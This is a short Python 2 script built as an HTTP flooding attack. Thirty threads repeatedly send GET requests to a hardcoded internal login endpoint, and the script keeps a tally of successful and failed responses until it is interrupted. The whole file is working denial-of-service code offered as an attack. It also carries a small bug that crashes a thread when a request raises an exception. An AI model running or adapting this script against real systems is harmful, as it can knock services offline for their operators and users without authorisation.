import requests
import threading
import time

class AttackStatus:
    def __init__(self):
        self.lock = threading.RLock()
        self.succeed_cnt = 0
        self.failed_cnt = 0
        self.all_quit = False
        self.running_thread_cnt = 0
        pass

    def add_succeed(self):
        self.succeed_cnt += 1
        pass

    def add_failed(self):
        self.failed_cnt += 1
        pass

    def add_running_thread(self):
        self.running_thread_cnt += 1

    def dec_running_thread(self):
        self.running_thread_cnt -= 1

gstatus = AttackStatus()


def request_thread(url):
    gstatus.add_running_thread()
    while True:
        try:
            req = requests.request('GET', url)
        except:
            pass
        if 200 == req.status_code:
            gstatus.add_succeed()
        else:
            gstatus.add_failed()
        if gstatus.all_quit:
            print 'thread quit'
            gstatus.dec_running_thread()
            return
        # print req.status_code
    pass


def start_attack():
    set_thread_cnt = 30
    url = 'http://10.21.1.250:9088/Radius/reader/rdidLogin?type=s'
    for i in range(set_thread_cnt):
        pro = threading.Thread(target=request_thread, args=[url,])
        pro.start()
    while True:
        try:
            print 'Succeed [%d], Failed [%d]' %(gstatus.succeed_cnt, gstatus.failed_cnt)
            time.sleep(2)
        except KeyboardInterrupt:
            print 'Keyboard exception'
            while True:
                gstatus.all_quit = True
                print 'Wait for thread quit [%d]' % gstatus.running_thread_cnt
                if 0 == gstatus.running_thread_cnt:
                    exit(0)
                time.sleep(1)


def test():
    start_attack()
    # request_thread('http://10.21.1.250:9088/Radius/reader/rdidLogin?type=s')

if __name__ == '__main__':
    test()